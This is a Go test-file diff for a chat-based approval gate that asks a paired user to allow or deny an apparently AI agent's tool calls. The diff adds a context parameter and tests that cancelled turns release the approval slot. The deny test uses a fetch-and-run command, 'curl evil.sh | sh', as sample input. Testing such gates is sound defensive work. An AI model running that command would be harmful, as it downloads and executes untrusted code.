@@ -27,7 +27,7 @@ func confirmLoop(answer Answer) (*askFakeConnector, *ChatConfirmer) {
 
 func TestChatConfirmerApprove(t *testing.T) {
 	conn, c := confirmLoop(Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested})
-	d := c.Confirm("Bash", "rm -rf build/")
+	d := c.Confirm(context.Background(), "Bash", "rm -rf build/")
 	if !d.Allow || d.RememberTool || d.RememberAll {
 		t.Errorf("decision = %+v, want plain allow", d)
 	}
@@ -42,7 +42,7 @@ func TestChatConfirmerApprove(t *testing.T) {
 
 func TestChatConfirmerDeny(t *testing.T) {
 	_, c := confirmLoop(Answer{Key: "deny", UserID: "7", Username: "u7", Attestation: AttestationAttested})
-	d := c.Confirm("Bash", "curl evil.sh | sh")
+	d := c.Confirm(context.Background(), "Bash", "curl evil.sh | sh")
 	if d.Allow {
 		t.Fatalf("decision = %+v, want deny", d)
 	}
@@ -55,7 +55,7 @@ func TestChatConfirmerDeny(t *testing.T) {
 // session-scoped tool allowance.
 func TestChatConfirmerAlwaysAttested(t *testing.T) {
 	_, c := confirmLoop(Answer{Key: "always", UserID: "7", Username: "u7", Attestation: AttestationAttested})
-	d := c.Confirm("Read", "main.go")
+	d := c.Confirm(context.Background(), "Read", "main.go")
 	if !d.Allow || !d.RememberTool {
 		t.Errorf("decision = %+v, want allow+remember", d)
 	}
@@ -65,7 +65,7 @@ func TestChatConfirmerAlwaysAttested(t *testing.T) {
 // to allow-once and says so in the chat.
 func TestChatConfirmerAlwaysBestEffort(t *testing.T) {
 	conn, c := confirmLoop(Answer{Key: "always", UserID: "7", Username: "u7", Attestation: AttestationBestEffort})
-	d := c.Confirm("Read", "main.go")
+	d := c.Confirm(context.Background(), "Read", "main.go")
 	if !d.Allow || d.RememberTool {
 		t.Errorf("decision = %+v, want allow-once only", d)
 	}
@@ -91,7 +91,7 @@ func TestChatConfirmerTextFallback(t *testing.T) {
 
 	type decision struct{ d core.ConfirmDecision }
 	done := make(chan decision, 1)
-	go func() { done <- decision{c.Confirm("Bash", "sleep 999")} }()
+	go func() { done <- decision{c.Confirm(context.Background(), "Bash", "sleep 999")} }()
 
 	// The question went out as text fallback with numbered options.
 	sends := conn.waitSends(t, 1)
@@ -115,7 +115,7 @@ func TestChatConfirmerNoChat(t *testing.T) {
 	conn := newFakeConnector(Capabilities{})
 	l := &Loop{Connector: conn, Info: func(string) {}, Warn: func(string) {}}
 	c := NewChatConfirmer(context.Background(), l)
-	d := c.Confirm("Bash", "ls")
+	d := c.Confirm(context.Background(), "Bash", "ls")
 	if d.Allow || !strings.Contains(d.Reason, "no paired chat") {
 		t.Errorf("decision = %+v, want refusal for missing chat", d)
 	}
@@ -140,7 +140,7 @@ func TestChatConfirmerApprovalNotes(t *testing.T) {
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			_, c := confirmLoop(tc.answer)
-			if d := c.Confirm("Bash", "make build"); !d.Allow {
+			if d := c.Confirm(context.Background(), "Bash", "make build"); !d.Allow {
 				t.Fatalf("decision = %+v, want allow", d)
 			}
 			notes := c.loop.takeNotes("100")
@@ -152,8 +152,86 @@ func TestChatConfirmerApprovalNotes(t *testing.T) {
 	}
 	// Denials leave no note: the refusal reason already names the actor.
 	_, c := confirmLoop(Answer{Key: "deny", UserID: "7", Username: "u7", Attestation: AttestationAttested})
-	_ = c.Confirm("Bash", "make build")
+	_ = c.Confirm(context.Background(), "Bash", "make build")
 	if notes := c.loop.takeNotes("100"); len(notes) != 0 {
 		t.Errorf("deny left notes: %v", notes)
 	}
+}
+
+// TestChatConfirmerCancelledTurnUnparksAndReleasesTheSlot is the bug this
+// parameter exists for.
+//
+// Bot mode serialises approvals — one question at a time, because interleaved
+// prompts in one chat are unanswerable — and the confirmer used to wait on the
+// DAEMON's context. So a turn the user had already cancelled kept its question
+// standing for the full ask timeout (two minutes by default), and the next
+// turn's first approval could not even be ASKED until that expired: it sat on
+// the slot, held by a turn that no longer existed.
+//
+// Two properties, and the second is the one that made this worth fixing: the
+// cancelled turn's Confirm returns promptly, AND the slot is free immediately
+// afterwards for a live turn.
+func TestChatConfirmerCancelledTurnUnparksAndReleasesTheSlot(t *testing.T) {
+	conn, c := confirmLoop(Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested})
+	conn.hold = make(chan struct{}) // the first ask parks until we say otherwise
+
+	abandoned, cancelAbandoned := context.WithCancel(context.Background())
+	first := make(chan core.ConfirmDecision, 1)
+	go func() { first <- c.Confirm(abandoned, "Bash", "sleep 999") }()
+	<-conn.asked // the question is out and the slot is taken
+
+	cancelAbandoned()
+	select {
+	case d := <-first:
+		if d.Allow {
+			t.Error("a cancelled turn's approval must deny, not allow")
+		}
+	case <-time.After(2 * time.Second):
+		t.Fatal("Confirm stayed parked after its turn was cancelled — it is still waiting on the ask timeout")
+	}
+
+	// The live turn must not be queued behind the abandoned one. Before the
+	// context reached Confirm this call blocked on the mutex until the first
+	// ask timed out, so the failure here was a two-minute stall, not an error.
+	close(conn.hold)
+	second := make(chan core.ConfirmDecision, 1)
+	go func() { second <- c.Confirm(context.Background(), "Bash", "make test") }()
+	select {
+	case d := <-second:
+		if !d.Allow {
+			t.Errorf("the next turn's approval = %+v, want the scripted allow", d)
+		}
+	case <-time.After(2 * time.Second):
+		t.Fatal("a live turn's approval never ran — the abandoned turn is still holding the one-ask slot")
+	}
+}
+
+// A turn cancelled while QUEUED — before its question is ever asked — must also
+// come back, or the queue is just a slower version of the same stall.
+func TestChatConfirmerCancelWhileWaitingForTheSlot(t *testing.T) {
+	conn, c := confirmLoop(Answer{Key: "approve", UserID: "7", Username: "u7", Attestation: AttestationAttested})
+	conn.hold = make(chan struct{})
+
+	blocking := make(chan core.ConfirmDecision, 1)
+	go func() { blocking <- c.Confirm(context.Background(), "Bash", "sleep 999") }()
+	<-conn.asked // the slot is taken and will not be given up
+
+	queued, cancelQueued := context.WithCancel(context.Background())
+	second := make(chan core.ConfirmDecision, 1)
+	go func() { second <- c.Confirm(queued, "Bash", "make test") }()
+	cancelQueued()
+
+	select {
+	case d := <-second:
+		if d.Allow {
+			t.Error("a cancelled queued approval must deny")
+		}
+		if !strings.Contains(d.Reason, "cancelled") {
+			t.Errorf("reason = %q, want it to name the cancellation", d.Reason)
+		}
+	case <-time.After(2 * time.Second):
+		t.Fatal("a queued approval ignored its own cancellation and waited for the slot")
+	}
+	close(conn.hold)
+	<-blocking
 }
